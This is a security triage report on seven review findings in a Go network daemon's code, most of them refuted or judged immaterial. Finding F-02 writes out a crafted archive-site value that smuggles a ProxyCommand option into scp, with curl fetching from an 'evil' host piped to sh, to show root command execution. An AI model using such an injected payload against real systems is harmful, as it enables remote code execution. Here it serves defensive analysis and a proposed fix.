# Triage result: ps-review-038-A7_go_daemon_host-b1

- **Subsystem:** A7_go_daemon_host — batch 1/2, 150 files under `pkg/daemon/` (Codex paladin-038-014)
- **Review base:** d4506d4450e2 (stated) — triaged against **current origin/master 57d24d9aed4b** (fetched this session; base is ~current, verified live)
- **Provenance:** REAL bpfrx (all cited symbols exist on origin/master; paths + line numbers resolve). NOT avacado.
- **Outcome counts:** 7 findings → **1 GENUINE-RESIDUAL (LOW)**, 2 REFUTED, 4 NOT-MATERIAL/DELIBERATE. 0 CONFABULATED-symbol, 0 DUP, 0 ALREADY-FIXED.

---

## F-01 — parseSrcPort wraps on ports >65535 / skips non-digits — **NOT-MATERIAL**

Symbol exists: `pkg/daemon/daemon_flow.go:244` `parseSrcPort` verbatim as quoted. Callers: `daemon_flowexport.go:470,471,493,494,530,531,550,551` (NetFlow/IPFIX `SrcPort`/`DstPort`/`NATSrcPort`/`NATDstPort`).

**Why not material — the wrap/non-digit path is dead by construction.** `parseSrcPort`'s only inputs are `rec.SrcAddr`/`rec.DstAddr`/`rec.NATSrcAddr`/`rec.NATDstAddr` on a `logging.EventRecord`. Those strings are produced exclusively by the ringbuf decoder from the binary session-close frame:
`pkg/logging/ringbuf.go:504` `srcStr = fmt.Sprintf("%s:%d", srcIP, evt.SrcPort)` (and the v6 `[%s]:%d` twin at :495, plus :846/:855 in the second decoder). `evt.SrcPort` etc. are **`uint16`** fields off the wire. So the port substring `parseSrcPort` reads back is always a machine-formatted `uint16` in `0..65535`, all digits — the `port*10 + digit` overflow branch and the non-digit-skip branch can never fire on real input.

The function is defensive parsing of a self-generated string; no operator- or attacker-controlled string reaches it (there is no user path that injects a raw `ip:port` into `EventRecord.SrcAddr` in production; the `aggregator_test.go` literals are the only "port >2 digits" callers and they stay ≤65535). Round-trip integrity holds. The reviewer's refutation stopped at "callers are flow-tracing" without tracing back to the `uint16` source — the wrap is unreachable, not merely non-security. Disposition: NOT-MATERIAL. (A `ParseUint(…,10,16)` swap is a harmless tidy, not a bug fix.)

## F-02 — scpArchiveTransfer argv injection via archive-sites (no `--`, no leading-dash reject) — **GENUINE-RESIDUAL (LOW, hardening)**

Symbol exists + path genuinely unguarded, verified end-to-end:
- `pkg/daemon/daemon_flow.go:366` `scpArchiveTransfer` → `exec.CommandContext(ctx, "scp", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes", srcPath, dest)` — **no `"--"` separator** before `srcPath`/`dest`.
- `dest` origin: `daemon_flow.go:281`/`daemon_archive_timer.go:111` `archiveToSites(cfg.System.Archival.ArchiveSites)` → per-site `transfer(ctx, srcPath, dest)`.
- `ArchiveSites` is taken **verbatim** as a config key: `pkg/config/compiler_system.go:202` `url := asNode.Keys[1]; sys.Archival.ArchiveSites = append(...)` (and the hierarchical twin at :226). Schema `pkg/config/schema_system.go:110` is free-form `{args:1, multi:true, placeholder:"<url>"}` — **no pattern/leading-dash validation**. The only archival validator is `compiler_validate_warn.go:876` (#651 inline-password warn) — it does not reject `-`.

**Scenario (crafted input):** `set system archival configuration transfer-on-commit` + `set system archival configuration archive-sites "-oProxyCommand=curl${IFS}evil|sh %h %p /tmp/x"` → on next commit `archiveConfig`→`archiveToSites`→`scpArchiveTransfer` runs `scp -o Strict… -o Batch… /tmp/xpf-archive-*/xpf.conf -oProxyCommand=…`. `scp`'s getopt parses the leading-dash `dest` as an option (`-o`/`-S`) → arbitrary command exec as the xpfd root user, or config exfil. CWE-88.

**Why LOW, not the Medium the review assigned.** The trust boundary is config-commit, which in xpf is already root-equivalent: a config-capable operator can equally `set system login`/scripts/interfaces to get root; xpf's login-class model is *coarse* (Junos perms mapped to coarse buckets, `compiler_system.go:882`) with no per-stanza commit authorization tier, so there is no "can set archival but not root" privilege level to escalate *from*. The review's HA-peer angle (a compromised peer pushing a malicious archive-site) is subsumed by config-sync, which already ships the full config (login/scripts) from peer to peer — the archive-site adds no capability the attacker lacks. So this is **defense-in-depth hardening, not a privilege escalation**.

**Why not dismiss.** The path is genuinely unguarded (confirmed: no `--`, no leading-dash reject from schema→compile→exec), the input is real, and the fix is cheap and correct: insert `"--"` before `srcPath`,`dest` in `scpArchiveTransfer` **and** reject `strings.HasPrefix(dest,"-")` at archival validation (`compiler_validate_warn`/a new `validateArchival`). Novel (not in dedup #4549/#4484 etc.), reachable, not fixed. Lane: **go**.

## F-03 — SNMP teardown Wait-before-Stop deadlock — **REFUTED (NOT-MATERIAL)**

Symbol exists: `pkg/daemon/daemon_snmp_reconcile.go:310` `teardownSNMPLocked` orders `snmpCancel()` → `snmpWg.Wait()` → `snmpAgent.Stop()` as quoted.

**Disproving code path — the reviewer guessed instead of reading `agent.Start`.** The serve goroutine runs `a.Start(ctx)` (`daemon_snmp_reconcile.go:267`). `pkg/snmp/agent.go:454` `Start` registers its **own** cancellation watcher:
```
go func() { <-ctx.Done(); a.Stop() }()   // agent.go:471-474
```
and the read loop returns `nil` when `a.stopped` is set after `conn.Close()` (`agent.go:478-487`, `Stop()` at :504 sets `stopped=true; a.conn.Close()`). So on `snmpCancel()`: ctx cancels → agent's internal goroutine calls `Stop()` → `conn.Close()` → `ReadFromUDP` unblocks with error → `stopped==true` → `Start` returns → `wg.Done()` → **`Wait()` unblocks**, all *before* teardown's own `Stop()`. Teardown's trailing `Stop()` is a belt-and-suspenders idempotent no-op (`conn` already nil). No deadlock; `Wait()` cannot hang on the socket read. The review's own refutation admitted "Real agent.Start likely blocks" — that is the misread; this is the A2 pattern (claimed HIGH/MED refuted by an upstream guard the reviewer never opened). Disposition: REFUTED.

## F-04 — probePinRetryEvery read without rpmMu (data race) — **REFUTED (confabulated writer)**

Symbol exists: `pkg/daemon/daemon_rpm.go:300` `interval := d.probePinRetryEvery` read outside `rpmMu`.

**Disproving evidence — there is no concurrent writer.** `git grep probePinRetryEvery` across origin/master returns exactly four hits: `daemon.go:176` (comment), `daemon.go:178` (field decl), `daemon_rpm.go:300` (the read), and `daemon_rpm_test.go:260` (`&Daemon{… probePinRetryEvery: 5*time.Millisecond}`). The **only write is the test struct literal**, set at construction *before* `maybeStartPinRetryLoopLocked`→`go d.probePinRetryLoop` ever starts (happens-before via goroutine creation). The reviewer's premise "Writers in `reconcileRPM` set `d.probePinRetryEvery`" is **confabulated** — `reconcileRPM` does not touch it (the fields it *does* mutate — `rpmPinsFailed`, `rpmPinRetryActive` — are correctly guarded by `rpmMu` at :309-320). Production never writes the field at all (it is a test-only cadence seam, comment `daemon.go:176`). No race under `-race` (single write, pre-goroutine). Disposition: REFUTED.

## F-05 — BPFRX_NEIGHBOR_PROBE_MAX_TARGETS unbounded env → goroutine fan-out — **DELIBERATE / NOT-MATERIAL**

Symbol exists: `pkg/daemon/daemon_neighbor_listener.go:67` `getNeighborProbeMaxTargets` (no upper clamp), consumed at `:369` in `forceProbeNeighbors`.

**Why not material.** (1) The knob is an **env var** — setting it requires root/systemd-unit edit, i.e. already root-equivalent; it is explicitly documented as an operator override (`:58-61` "Override via env … for sites with very large address-books"). (2) The actual goroutine count is `min(len(targets), cap)` where `targets = collectMonitoredNeighbors(cfg)` (`:365`) — the deduped union of configured next-hops/NAT-dsts/address-book hosts/fabric peers/snapshot keys, i.e. **bounded by config size**. Raising `cap` alone spawns nothing extra; you would additionally need a config with ~1M monitored neighbors, itself an operator artifact. So the "1M goroutines OOM" needs a huge env override *and* a correspondingly huge config — a self-inflicted foot-gun behind a root gate, with a `slog.Warn` when truncation engages. Deliberate documented tradeoff. A defensive `min(n, 4096)` clamp is optional polish, not a residual bug. Disposition: DELIBERATE/NOT-MATERIAL.

## F-06 — archiveToSites detached cleanup goroutine → temp-dir leak — **NOT-MATERIAL**

Symbol exists: `pkg/daemon/daemon_flow.go:356-360` detached `go func(){ wg.Wait(); os.RemoveAll(tmpDir) }()`.

**Why not material — self-healing within the scp timeout.** Each per-site scp goroutine runs under `context.WithTimeout(context.Background(), 30*time.Second)` (`:344`), so `wg.Wait()` completes within ≤30 s and the cleanup goroutine `os.RemoveAll(tmpDir)`s promptly. Normal operation leaves at most `commit-rate × 30 s` transient dirs — negligible. On SIGTERM, in-flight archives leave at most a handful of `/tmp/xpf-archive-*` dirs (one per in-flight site), each a `0600` file in a `0700` dir (`:328`, `:332`), reaped by tmpfiles.d/reboot. No unbounded accumulation, no security exposure (owner-only, encrypted-secrets file already 0600). INFO-level hygiene, not a correctness/security residual. Disposition: NOT-MATERIAL.

## F-07 — VLAN ID from sub-interface name not range-checked — **NOT-MATERIAL**

Symbol exists: `pkg/daemon/daemon_apply.go:1124-1130` `Atoi(subName[dotIdx+1:])` → `rethUnitHasIPv6(rethCfg, vid)`.

**Why not material.** `subName` is enumerated from `netlink.LinkList()` filtered by `l.Attrs().ParentIndex == parentIdx` (`daemon_apply.go:1104-1108`) — i.e. actual kernel child devices of the RETH member. A VLAN child on that parent is named `<parent>.<vid>` with `vid` kernel-constrained to 0..4094, and the daemon itself created it from a configured unit, so `Atoi` round-trips a value that *matches* a real `rethCfg` unit; negative/>4094 cannot arise from a daemon-created VLAN child name. In the contrived "operator hand-attaches a non-VLAN dotted device as a child" case, `vid` simply misses the map lookup → `ensureRethLinkLocal` is skipped → **no panic, no security impact** — at worst a link-local re-add is deferred to the next commit (self-healing connectivity nicety). The value is a *lookup key*, never an index/allocation size, so a bad parse degrades gracefully. Disposition: NOT-MATERIAL (LOW/INFO at most; the review self-rated Low/Med-confidence).

---

## Genuine residual (1)

| id | sev | file:line | fix | lane |
|----|-----|-----------|-----|------|
| F-02 | LOW | `pkg/daemon/daemon_flow.go:366` (`scpArchiveTransfer`) + `pkg/config/compiler_system.go:202` (verbatim `ArchiveSites`) | Insert `"--"` before `srcPath,dest` in the `scp` argv **and** reject archive-site strings with a leading `-` at archival validation (new `validateArchival` / extend `compiler_validate_warn.go:876`). | go |

All other findings: F-01/F-06/F-07 NOT-MATERIAL, F-05 DELIBERATE, F-03/F-04 REFUTED (upstream guard / confabulated writer). No dups, no already-fixed, no confabulated symbols.
